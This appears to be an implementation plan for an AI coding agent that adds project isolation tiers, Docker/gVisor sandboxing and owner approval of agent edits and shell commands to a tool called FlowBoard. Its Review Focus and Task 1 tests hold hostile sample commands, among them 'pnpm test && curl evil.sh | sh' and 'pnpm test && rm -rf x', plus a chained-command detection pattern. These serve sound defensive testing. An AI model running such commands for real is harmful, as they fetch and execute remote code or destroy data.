# Isolation Enforcement Implementation Plan (projects phase 3a: the sandbox tier in run-flow)

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A project's Isolation setting (`trust`: Trusted / Normal / Untrusted) decides where every run of that
project executes. Today it is stored and ignored, and only a flow YAML's `sandbox:` block sandboxes anything.

**Architecture:** run-flow finds the registered project that owns `--folder` (refusing when none does), resolves its
`trust`, and turns that into the run's isolation with one pure function (`isolation.ts`). The result is pinned in
`flow.json`, so `--resume` keeps it. Normal and Untrusted give every step a Docker box (Untrusted under gVisor's
`runsc`, or the run is refused). Trusted runs on the machine, and agents ask the owner before each file edit and
shell command through a new `RunSpec.approve` callback that both adapters honour. "Allow from now on" answers are
saved on FlowBoard's project record (never in the repo) and listed on the project page with a remove button.

**Tech Stack:** TypeScript on Node 24 with type stripping, `node --test`, zod 4, Claude Agent SDK hooks, OpenCode SDK
v2 permission events, Next 16 + TanStack Query + shadcn/ui + lucide-react for the project page.

**Spec:** Alex's decisions in this conversation (2026-11-13), recorded in memory as
`flowboard-isolation-enforcement-decisions`, copied verbatim into Global Constraints. Background:
`docs/FlowBoard/Projects/Repository Trust And Sandboxing.md`, `docs/FlowBoard/Projects/Project Settings.md`.

**Not in this plan:** the project budget (phase 3b), the egress proxy (Docker boxes stay online for agents), a
New run form that picks a project instead of a folder (run-flow's refusal text reaches the form already), and
`pnpm run-agent` (a single agent, not a flow).

## Global Constraints

- All paths are under `code/flowboard/` unless they start with `docs/`. Run commands from `code/flowboard/`.
- Branch `feature/isolation-enforcement`, cut from `dev` in its own worktree. Do not merge into `dev`; Alex decides.
- **A flow never runs without a project.** run-flow refuses a `--folder` that no registered project owns
  (`owns()` in `projects.ts`, on real paths). `--check` and `--mermaid` run nothing and stay project-free.
- **The project's tier is the floor.** A flow's `sandbox:` block may only be as strong or stronger; nothing in a
  flow or the repo can weaken it. Strength: host < docker = opensandbox < gvisor.
- **Untrusted = gVisor or refuse.** No container fallback on a host without gVisor (macOS included).
- **Trusted = the machine, with approvals for writes and shell only.** Reads, searches and FlowBoard's own tools
  pass. Each approval offers Allow / Allow from now on / Deny.
- **"Allow from now on" is project-wide**, saved on the project record in `data/projects.json`, revocable on the
  project page. Edits are allowed by tool kind (all file edits); shell commands by prefix.
- No new dependencies. Icons from `lucide-react`. Light only, zero radius, house tokens.
- Refusals are run-flow `printErr` lines ending in exit code 2, so the runs page's New run form shows them as is.

## Decisions this plan makes (for Alex's review)

1. Normal with no `sandbox:` block uses `{ runtime: 'docker', image: 'flowboard-cli', env: <the credentials the
   flow's agents need> }`, the image `docker/Dockerfile` builds. Claude steps in a box need
   `CLAUDE_CODE_OAUTH_TOKEN` (a container cannot read the macOS keychain), so **a Normal project's runs are refused
   until that variable is set in the environment FlowBoard runs in**. The refusal says how (`claude setup-token`).
2. Untrusted with a flow that asks for `runtime: opensandbox`: refused. OpenSandbox's box is not gVisor.
3. Shell steps (the flow's or the project's check command) never ask, even in Trusted: they are the recipe's
   and the project's own commands, not an agent's choice.
4. An approval only gates what the flow's tool policy and guards already allow; it never grants more. On Claude, a
   shell command the allow list does not permit is still asked, then refused by the policy (ponytail ceiling;
   upgrade path: match `toolPolicy.allow` before asking).
5. A saved shell prefix is the command's first word, plus its second when that does not start with `-`
   (`pnpm test --filter x` → `pnpm test`; `ls -la` → `ls`). A command holding any of `; & | < > $ ` ( ) \` or a
   newline is never matched by a saved rule and cannot be saved as one.
6. Isolation is decided when the run starts and pinned; `--resume` keeps it even if the project's setting changed
   since, but refuses when the project is gone. Saved rules are read fresh at every approval.

## Review Focus

1. A compound command (`pnpm test && curl evil.sh | sh`) against a saved `pnpm test` rule must be asked, not
   auto-allowed. Test: Task 1 `allowedBy refuses chained commands`.
2. A step stopped, timed out or Ctrl+C'd while its approval waits must withdraw the question (no ask file left in
   `<runDir>/asks/`) and not hang. Test: Task 6 `a stopped step withdraws its approval`.
3. `--folder` given as a symlink into the repo, or a task worktree under `<repo>/.flowboard/worktrees/`, must still
   find the project. Test: Task 3 `findProject follows links and owns worktrees`.
4. `--resume` of a run whose project was removed must refuse; one whose trust changed must keep the pinned tier.
   Test: Task 3 `resume refuses without its project`.
5. Normal project with Docker down, the image missing, or `CLAUDE_CODE_OAUTH_TOKEN` unset must refuse before any run
   folder or workspace is made, naming the fix. Test: Task 3 `normal refuses when docker is not ready`.

---

### Task 1: Approval rules, and where they are kept

**Files:**
- Create: `packages/cli/src/approvals.ts`
- Modify: `packages/cli/src/projects.ts` (Project, ProjectEdit, updateProject; new addApproval)
- Modify: `app/api/projects/[id]/route.ts` (Edit schema, usage text)
- Test: `packages/cli/test/approvals.test.ts` (new), `packages/cli/test/projects.test.ts`

**Interfaces:**
- Produces:
  - In `packages/core/src/ports/agent-provider.ts`, exported from `@flowboard/core`:
    `export type ApprovalCall = { kind: 'edit'; tool: string; path: string } | { kind: 'shell'; command: string }`
  - `export type ApprovalRule = { kind: 'edit' } | { kind: 'shell'; prefix: string }`
  - `export const ApprovalRuleSchema: z.ZodType<ApprovalRule>`
  - `ruleFor(call: ApprovalCall): ApprovalRule | undefined`: undefined for a chained shell command
  - `allowedBy(rules: ApprovalRule[], call: ApprovalCall): ApprovalRule | undefined`: the rule that allows it
  - `ruleText(rule: ApprovalRule): string`: `every file edit` / `commands starting "pnpm test"`
  - `Project.approvals?: ApprovalRule[]` (absent on older records = none)
  - `ProjectEdit.approvals?: ApprovalRule[]` replaces the list
  - `addApproval(dataDir: string, id: string, rule: ApprovalRule): Result<Project>`: no duplicate rules

- [ ] **Step 1: Write the failing tests**

```ts
test('ruleFor: edits by kind, shell by prefix', () => {
  assert.deepEqual(ruleFor({ kind: 'edit', tool: 'Edit', path: '/r/a.ts' }), { kind: 'edit' });
  assert.deepEqual(ruleFor({ kind: 'shell', command: 'pnpm test --filter x' }), { kind: 'shell', prefix: 'pnpm test' });
  assert.deepEqual(ruleFor({ kind: 'shell', command: 'ls -la' }), { kind: 'shell', prefix: 'ls' });
  assert.equal(ruleFor({ kind: 'shell', command: 'pnpm test && rm -rf x' }), undefined);
});
test('allowedBy refuses chained commands', () => {
  const rules: ApprovalRule[] = [{ kind: 'shell', prefix: 'pnpm test' }];
  assert.ok(allowedBy(rules, { kind: 'shell', command: 'pnpm test' }));
  assert.ok(allowedBy(rules, { kind: 'shell', command: 'pnpm test --watch=false' }));
  for (const c of ['pnpm testx', 'pnpm test && curl x', 'pnpm test | sh', 'pnpm test; rm x', 'pnpm test $(id)', 'pnpm test > /etc/x', 'pnpm test\nrm x'])
    assert.equal(allowedBy(rules, { kind: 'shell', command: c }), undefined, c);
  assert.equal(allowedBy(rules, { kind: 'edit', tool: 'Write', path: '/r/a' }), undefined);
});
```

In `projects.test.ts`: `addApproval` twice with the same rule leaves one; `updateProject(..., { approvals: [] })`
empties the list; `{ approvals: [{ kind: 'shell', prefix: '' }] }` is a 400.

- [ ] **Step 2: Run them and see them fail**

Run: `node --test packages/cli/test/approvals.test.ts packages/cli/test/projects.test.ts`
Expected: FAIL, `approvals.ts` not found.

- [ ] **Step 3: Implement `approvals.ts` and the record changes**

Chained = `/[;&|<>$`()\\\n]/`. `ApprovalRuleSchema`: shell prefix is a trimmed, non-empty string that is not
itself chained. The PATCH route's `Edit` gains `approvals: z.array(z.unknown()).optional()`, validated by
`updateProject` (400 with `an approval is { kind: 'edit' } or { kind: 'shell', prefix }`).

- [ ] **Step 4: Run them and see them pass**, then `pnpm test:packages` and `pnpm test:app` stay green.

- [ ] **Step 5: Commit** `feat(projects): approval rules kept on the project record`

---

### Task 2: Docker readiness and gVisor

**Files:**
- Modify: `packages/cli/src/project.ts` (next to `dockerDefaultMemoryMb`)
- Modify: `packages/adapters/src/exec/docker.ts:11-34` (`dockerArgs`)
- Test: `packages/adapters/test/docker.test.ts` (`dockerArgs`), `packages/cli/test/isolation.test.ts` (new; the two helpers)

**Interfaces:**
- Produces:
  - `dockerHasGvisor(docker = 'docker'): boolean`: `docker info --format '{{json .Runtimes}}'` lists `runsc`
  - `dockerNotReady(image: string, docker = 'docker'): string | undefined`: undefined when `docker image inspect
    <image>` succeeds; else `Docker is not running` or `no image <image>; build it from code/flowboard: docker
    build -f docker/Dockerfile -t <image> .`
  - `dockerArgs` adds `--runtime runsc` when `profile.tier === 'gvisor'`

- [ ] **Step 1: Write the failing test**: `dockerArgs({ tier: 'gvisor', image: 'i', egressAllow: [] }, ...)` contains
  the adjacent pair `'--runtime', 'runsc'`; the `container` tier does not. For the two helpers, pass a fake `docker`
  (a temp executable `sh` script printing fixed output with a fixed exit code): runtimes `{"runc":{},"runsc":{}}` →
  true, `{"runc":{}}` → false; `image inspect` exit 0 → undefined, exit 1 with `info` ok → the `no image` text,
  `info` failing → `Docker is not running`.
- [ ] **Step 2: Run and see it fail**: `node --test packages/adapters/test/docker.test.ts packages/cli/test/isolation.test.ts`
- [ ] **Step 3: Implement** with `spawnSync`, 10 s timeout, like `dockerDefaultMemoryMb`.
- [ ] **Step 4: Run and see it pass.**
- [ ] **Step 5: Commit** `feat(sandbox): gVisor runtime flag, docker readiness check`

---

### Task 3: run-flow enforces the project's tier

**Files:**
- Create: `packages/cli/src/isolation.ts`
- Modify: `packages/cli/src/run.ts:19-37` (`RunDeps`)
- Modify: `packages/cli/src/flow-run.ts` (`runFlow` after the first `loadFlow`, before `--workspace`; `resume`; the
  pinned `flow.json`)
- Modify: `packages/cli/src/flow-config.ts:31-35` (`FlowConfig.isolation`), and export `NEEDS`
- Modify: `packages/cli/test/fixtures/flow.ts` (`flowProject` registers `proj` as a Trusted project)
- Test: `packages/cli/test/isolation.test.ts` (new), `packages/cli/test/flow-run.test.ts`

**Interfaces:**
- Consumes: `dockerHasGvisor`, `dockerNotReady` (Task 2); `owns`, `readProjects` (`projects.ts`);
  `readAppSettings` (`app-settings.ts`); `resolveSettings`, `Trust` (`settings.ts`).
- Produces:
  - `findProject(dataDir: string, folder: string): Project | undefined`: compares real paths
  - `export interface Isolation { projectId: string; trust: Trust; tier: 'host' | 'container' | 'gvisor' | 'opensandbox'; approvals: boolean }`
  - `isolationFor(trust: Trust, flow: Sandbox | undefined, needs: string[], gvisor: boolean): { sandbox?: Sandbox; tier: Isolation['tier']; approvals: boolean } | { refused: string }`
    (`needs`: the credential variables the flow's agents need, from `NEEDS`)
  - `FlowConfig.isolation?: Isolation`, pinned with the config
  - `Sandbox` docker variant gains `gvisor?: true`; `sandboxFor` passes `tier: sb.gvisor ? 'gvisor' : 'container'`
  - `RunDeps.dataDir?: string` (default `FLOWBOARD_DATA_DIR` resolved from `cwd`, else `<cwd>/data`, as the app's
    `dataDir()`), `RunDeps.docker?: { gvisor(): boolean; notReady(image: string): string | undefined }`

`isolationFor` table:

| trust | flow `sandbox:` | result |
|---|---|---|
| trusted | none | host, `approvals: true` |
| trusted | any | the flow's, `approvals: false` |
| normal | none | docker `flowboard-cli`, `env: needs` |
| normal | any | the flow's |
| untrusted | none / docker, gVisor | docker (the flow's image, or `flowboard-cli`), `gvisor: true` |
| untrusted | opensandbox | refused: `Untrusted runs need gVisor; this flow's OpenSandbox box is not gVisor` |
| untrusted | any, no gVisor | refused: `Untrusted runs need gVisor, and this machine's Docker has no runsc runtime; set the project to Normal, or run it on a Linux host with gVisor` |

Then in `runFlow`, for a run (not `--check`/`--mermaid`), in this order, each a `printErr` + `return 2`:
1. no project: `<folder>: not in a FlowBoard project; create one for this repo first`
2. `isolationFor` refused
3. a docker tier: `dockerNotReady(image)`, then each `needs` variable unset: `<VAR> is not set: a container
   cannot use this machine's login. Run \`claude setup-token\` and set CLAUDE_CODE_OAUTH_TOKEN where FlowBoard runs`
   (the OpenRouter line names `OPENROUTER_API_KEY`).
Print before `-- sandbox limits`: `-- isolation: <label> (<tier>), from project <name>`, using `TRUST[trust].label`;
on host with approvals add `; agents ask before edits and shell commands`.

- [ ] **Step 1: Make the fixture register a project.** `flowProject` writes `<base>/data/projects.json` holding one
  record for `<base>/proj` with `overrides: { trust: 'trusted' }`, `type: 'software'`, `source: { kind: 'local' }`.
  Run `node --test packages/cli/test/flow-run.test.ts`: still green (nothing reads it yet).
- [ ] **Step 2: Write the failing tests**

`isolation.test.ts`: one assertion per table row; `findProject follows links and owns worktrees` (a symlink to
the repo, and `<repo>/.flowboard/worktrees/task-1`, both return the project; a sibling folder returns undefined).

`flow-run.test.ts`, with `deps.docker` faked:
- `refuses a folder outside every project` (rewrite `projects.json` to `[]`; exit 2; message 1; no `runs/` made)
- `--check needs no project` (empty `projects.json`; exit 0)
- `normal refuses when docker is not ready` (trust `normal`, `notReady` returns `Docker is not running`; exit 2;
  no run folder and no workspace made)
- `normal boxes a flow with no sandbox` (`notReady` undefined, `CLAUDE_CODE_OAUTH_TOKEN` set in the test's env;
  `flow.json`'s `config.sandbox` is `{ runtime: 'docker', image: 'flowboard-cli', env: ['CLAUDE_CODE_OAUTH_TOKEN'], ... }`
  and `config.isolation.tier === 'container'`; stop the run at its first step with the scripted provider)
- `untrusted refuses without gvisor`
- `resume refuses without its project` (start a run that pauses at a gate, empty `projects.json`, `--resume`; exit 2,
  `cannot resume: its project is gone`), and a resume after the trust changed keeps `isolation` from `flow.json`
- [ ] **Step 3: Run and see them fail.**
- [ ] **Step 4: Implement** `isolation.ts` and the `runFlow`/`resume` wiring; drop `config.sandbox` from the YAML
  in favour of `isolationFor`'s, before the existing limits block at `flow-run.ts:141`, so limits apply to it.
- [ ] **Step 5: Run `pnpm test:packages`; all pass.** Update `flow-live.test.ts` and `flow-opensandbox-live.test.ts`
  setups to register their folder as a project (they are not run here: they cost money).
- [ ] **Step 6: Commit** `feat(run-flow): a run needs a project, and runs at its isolation tier`

---

### Task 4: `RunSpec.approve`, and Claude asks before writes and shell

**Files:**
- Modify: `packages/core/src/ports/agent-provider.ts` (`RunSpec.approve`)
- Modify: `packages/adapters/src/agent/claude/options.ts:71-83` (the PreToolUse hook)
- Test: `packages/adapters/test/claude-options.test.ts`

**Interfaces:**
- Consumes: `ApprovalCall` (Task 1).
- Produces:
  - `RunSpec.approve?: (call: ApprovalCall) => Promise<boolean>`: doc: asked before each file edit and shell
    command the guards let through; false denies it; never grants what the tool policy refuses.
  - The hook: guards first (a guard deny never reaches the owner); then for `Write`, `Edit`, `MultiEdit`
    (`tool_input.file_path`), `NotebookEdit` (`notebook_path`) and `Bash` (`command`), `await spec.approve(call)`;
    false → `permissionDecision: 'deny'`, reason `the project owner denied this`; true → `{}` (normal permissions
    still apply). The hook is registered when `guards` or `approve` is set.

- [ ] **Step 1: Write the failing tests**: `approve hook asks for Bash and edits, not reads` (fake `approve` records
  calls: `Bash {command:'ls'}` → asked; `Read` → not asked; `Edit {file_path:'/repo/wt/a'}` → asked with
  `{ kind: 'edit', tool: 'Edit', path: '/repo/wt/a' }`); `a denied approval denies the tool`; `a guard deny is not
  asked` (`Edit` outside `writeRoots` → denied, `approve` never called); `registers the hook for approve alone`.
- [ ] **Step 2: Run and see them fail**: `node --test packages/adapters/test/claude-options.test.ts`
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run and see them pass**; `pnpm test:packages` green.
- [ ] **Step 5: Commit** `feat(claude): ask the owner before edits and shell commands when approve is set`

---

### Task 5: OpenCode asks the same way

**Files:**
- Modify: `packages/adapters/src/agent/opencode/permissions.ts` (`toPermissionRules`, new `actionFor`)
- Modify: `packages/adapters/src/agent/opencode/provider.ts:207-215` (the `permission.asked` handler)
- Test: `packages/adapters/test/opencode-permissions.test.ts`, `packages/adapters/test/opencode-provider.test.ts`

**Interfaces:**
- Consumes: `RunSpec.approve`, `ApprovalCall` (Task 4).
- Produces:
  - `actionFor(rules: PermissionRule[], permission: string, pattern: string): PermissionRule['action']`: last match
    with `wildcardMatch` on both, `'ask'` when nothing matches
  - With `spec.approve`, `toPermissionRules` appends `{ edit, *, ask }` and `{ bash, *, ask }` just before the
    `toolPolicy.deny` rules, so allowed edits and commands reach `permission.asked`.
  - The handler: for `edit`/`bash` with `spec.approve`, if every pattern is `allow` under the rules **without** those
    two (`toPermissionRules({ ...spec, approve: undefined })`), ask `approve` (edit: `path` =
    `String(metadata.filepath ?? patterns[0])` resolved from `directory`; bash: `command` =
    `typeof metadata.command === 'string' ? metadata.command : patterns.join('; ')`) and reply `once` or `reject`
    with `the project owner denied this`. Everything else: `replyFor` as today.

- [ ] **Step 1: Write the failing tests**: `actionFor takes the last match`; `approve adds ask rules before the
  denies` (a `Bash(rm *)` deny still comes last); provider: `asks approve for an allowed bash command`,
  `rejects without asking for one the policy does not allow`, `a denied approval rejects` (reuse the fake
  `permission.asked` event at `opencode-provider.test.ts:68`).
- [ ] **Step 2: Run and see them fail.**
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run and see them pass**; `pnpm test:packages` green.
- [ ] **Step 5: Commit** `feat(opencode): ask the owner before edits and shell commands when approve is set`

---

### Task 6: run-flow asks the owner, and keeps "Allow from now on"

**Files:**
- Modify: `packages/cli/src/flow-exec.ts` (`ExecContext.approve`; `execAi` sets `spec.approve` with an
  `AbortController` aborted by `stop()` and in its `finally`)
- Modify: `packages/cli/src/flow-run.ts` (`drive`: build the approver when `config.isolation?.approvals`; pass it
  per step in `runCtx`, beside the step's `ask`)
- Modify: `packages/cli/src/approvals.ts` (the approver)
- Test: `packages/cli/test/approvals.test.ts`, `packages/cli/test/flow-run.test.ts`

**Interfaces:**
- Consumes: `ruleFor`, `allowedBy`, `ruleText`, `addApproval` (Task 1); `RunSpec.approve` (Task 4).
- Produces:
  - `ExecContext.approve?: (call: ApprovalCall, signal: AbortSignal) => Promise<boolean>`
  - `approver(o: { dataDir: string; projectId: string; folder: string; ask: (qs: Question[], s: AbortSignal) => Promise<Answers>; show(line: string): void; step: string }): (call: ApprovalCall, signal: AbortSignal) => Promise<boolean>`
    in `approvals.ts`. It reads the project's rules fresh; a match shows `-- <step>: allowed by a saved rule
    (<ruleText>)` and returns true without asking. Otherwise it asks one `single_select` question, id `approve`:
    prompt `Edit <path relative to folder>?` or `Run <command>?`; options `once` "Allow", `always` "Allow from now
    on: <ruleText>" (left out when `ruleFor` is undefined, with help `This command chains or redirects, so it can
    only be allowed once.`), `deny` "Deny". `always` calls `addApproval`. Shows `-- <step>: allowed <what>` or
    `-- <step>: denied <what>`.
  - The approver's asks go through the step's `ask` (`flow-run.ts:766`), so the step's clock stops while it waits
    and the page and terminal both offer it.

- [ ] **Step 1: Write the failing tests**: in `approvals.test.ts`, `approver` with a fake `ask` and a temp data
  dir: a saved rule skips the question; `always` saves the rule (one rule after two `always` answers); a chained
  command has no `always` option; `deny` returns false. In `flow-run.test.ts`, with a scripted provider whose
  `launch` calls `spec.approve` before ending: `trusted asks before an agent's shell command` (the page answer
  file allows it; the run ends ok); `a stopped step withdraws its approval` (Ctrl+C via `signals` while it waits;
  `<runDir>/asks/` is empty after; exit is the usual interrupted one); `normal never asks` (no `approve` on the spec).
- [ ] **Step 2: Run and see them fail.**
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run and see them pass**; `pnpm test:packages` green.
- [ ] **Step 5: Commit** `feat(run-flow): Trusted runs ask before agents' edits and shell commands`

---

### Task 7: The pages say what now happens

**Files:**
- Modify: `packages/cli/src/settings.ts:50-54` (`TRUST` texts)
- Modify: `app/projects/settings-pages.tsx:126` (drop `footnote={NOT_YET}` from Isolation only)
- Modify: `app/projects/settings-model.ts:128-131` (the two Sandbox warnings)
- Modify: `app/projects/wizard/wizard.tsx:136` (drop `· sandboxed in a container`)
- Modify: `app/projects/project.tsx` (an "Allowed from now on" card)
- Test: `app/projects/settings-model.test.ts:43-50`

Copy (exact):
- `TRUST.trusted.text`: `No sandbox. Agents ask before each file edit and shell command; “Allow from now on” keeps the answer for this project.`
- `TRUST.normal.text`: `A throwaway container per step. Only the repo’s folder is writable. Agents can still reach the internet until the egress proxy is built.`
- `TRUST.untrusted.text`: `A container under gVisor, a stronger wall for code nobody has reviewed. Needs a Linux host with gVisor; anywhere else, runs are refused.`
- Trusted warning: `With no sandbox, agents in ${flows} stop before each file edit and shell command until you allow it.`
- Untrusted off Linux: `gVisor runs on Linux only; on this ${Mac|machine}, every run of this project is refused.`
- No page warning for an unset `CLAUDE_CODE_OAUTH_TOKEN`: run-flow's refusal says it (add one if it bites).

"Allowed from now on" card on the project page, shown when `p.approvals?.length`: one row per rule with
`ruleText(rule)` and an icon button (lucide `X`, `aria-label="Remove <ruleText>"`) that PATCHes
`{ approvals: <the rest> }` and invalidates `['projects']`. Under it: `Agents in this project run these without asking.`

- [ ] **Step 1: Update the two assertions in `settings-model.test.ts` to the new warning texts; run
  `pnpm test:app`; see them fail.**
- [ ] **Step 2: Make the copy changes and the card.**
- [ ] **Step 3: `pnpm test:app` and `pnpm test:packages` green; `pnpm lint`, `pnpm typecheck:packages` and
  `pnpm build` clean.**
- [ ] **Step 4: Check in the browser** (`/run` skill): the project page of a Trusted project with a saved rule
  shows the card, and removing the rule removes the row after a reload.
- [ ] **Step 5: Commit** `feat(projects): the sandbox page and wizard say what isolation does; saved approvals listed`

---

### Task 8: Docs

**Files:**
- Modify: `docs/FlowBoard/Projects/Project Settings.md:44` (no longer "does not act on it yet"), `Projects Index.md:22`
  (trust leaves the not-yet list), `Repository Trust And Sandboxing.md` (a "Built" section: the table from Task 3,
  approvals, decisions 1–6), `Projects Open Questions.md` #16 (answered: per project, the project's tier is the floor)
- Modify: `code/flowboard/docker/README.md` (Normal and Untrusted projects use `flowboard-cli` by default; the token)
- Modify: `docs/FlowBoard/Running Agent Work.md` wherever it says the flow's `sandbox:` alone decides

- [ ] **Step 1: Edit them.** Quote nothing that the code no longer does; `grep -rn "not act on it yet\|does not act" docs code/flowboard/app` shows only the settings still pending.
- [ ] **Step 2: Commit** `docs(projects): isolation is enforced`
